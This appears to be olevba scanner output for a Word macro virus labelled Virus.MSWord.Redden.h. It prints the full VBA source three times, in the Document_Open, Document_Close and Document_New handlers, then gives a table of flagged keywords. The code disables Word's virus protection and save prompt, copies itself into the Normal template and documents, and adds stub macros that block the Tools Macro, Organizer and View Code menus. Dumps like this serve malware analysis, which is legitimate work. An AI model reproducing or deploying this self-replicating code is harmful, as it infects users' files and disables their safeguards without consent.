olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()

End Sub

Private Sub Document_Close()
'      ^    |   | ----- |
'     / \   | \ |   |   |
'    /---\  |  \|   |   |
'   /     \ |   |   |   |
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False

If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "ANTISimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ANTISimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("ANTISimplyRed").CodeModule
eol = Chr(13) + Chr(10)
'
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
'
End If
Phuck:
End Sub

Private Sub Document_New()
'      ^    |   | ----- |
'     / \   | \ |   |   |
'    /---\  |  \|   |   |
'   /     \ |   |   |   |
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False

If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "ANTISimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ANTISimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("ANTISimplyRed").CodeModule
eol = Chr(13) + Chr(10)
'
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
'
End If
Phuck:
End Sub





Private Sub Document_Open()
'      ^    |   | ----- |
'     / \   | \ |   |   |
'    /---\  |  \|   |   |
'   /     \ |   |   |   |
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False

If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "ANTISimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ANTISimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("ANTISimplyRed").CodeModule
eol = Chr(13) + Chr(10)
'
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
'
End If
Phuck:
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

